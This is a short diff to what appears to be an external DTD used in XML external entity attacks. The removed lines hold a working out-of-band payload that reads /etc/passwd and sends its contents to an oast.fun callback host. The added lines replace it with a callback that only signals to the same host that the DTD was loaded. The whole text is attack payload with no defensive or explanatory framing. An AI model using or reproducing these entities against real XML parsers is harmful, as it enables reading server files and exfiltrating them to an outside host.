@@ -1,4 +1,2 @@
-<!ENTITY % file PUBLIC "flag" "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate PUBLIC 'x' 'https://xbqvnbfbpqnlefpawaixdjdz8gfeokzv3.oast.fun/?x=%file;'>">
-%eval;
-%exfiltrate;
+<!ENTITY % ping PUBLIC "x" "https://xbqvnbfbpqnlefpawaixdjdz8gfeokzv3.oast.fun/dtd-loaded">
+%ping;
